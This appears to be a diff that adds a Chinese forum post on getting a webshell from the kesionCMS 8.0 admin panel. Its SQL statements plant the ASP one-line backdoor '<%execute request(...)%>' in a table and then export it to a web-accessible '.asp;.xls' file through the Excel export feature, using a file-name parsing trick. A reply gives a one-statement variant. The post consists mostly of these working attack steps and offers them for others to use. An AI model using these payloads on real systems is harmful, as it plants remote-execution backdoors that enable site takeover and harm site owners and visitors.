@@ -1,0 +1,25 @@
+kesionCMS 8.0 后台拿 shell
+
+文章内容摘要：
+前段时间鬼哥，发了kesion 的任意下载漏洞，关于拿shell 一步代过。其实拿shell还是很简单的。方法多的是。刚刚一个兄弟要我拿个shell ，我就发一种拿shell 方法给大家参考下。 点sql 命令执行。 1.create table 0ldgui (a varchar(50)) 创建一个表\\ 2.inse
+
+
+
+前段时间鬼哥，发了kesion 的任意下载漏洞，关于拿shell 一步代过。其实拿shell还是很简单的。方法多的是。刚刚一个兄弟要我拿个shell ，我就发一种拿shell 方法给大家参考下。
+ 
+点sql 命令执行。 
+
+1.create table 0ldgui (a varchar(50)) 创建一个表\\ 
+
+2.insert into 0ldgui (a) values ('<%execute request("0ldgui")%>') 插入一句话 
+
+3.select * into [a] in 'f:/web/0ldgui.asp;.xls' 'excel 4.0;' from 0ldgui 导出， 在数据库备份可以看到绝对路径
+ 
+很常用的一个asp sql 拿shell方法 
+
+--------------------------------------------------------------------------------
+ 
+y4q1an：
+ 
+SELECT '<%execute request("a")%>' into [表名] in '网站路径+导出的名字（1.asa;1.xls）' 'excel 8.0;' from 表名
+ 
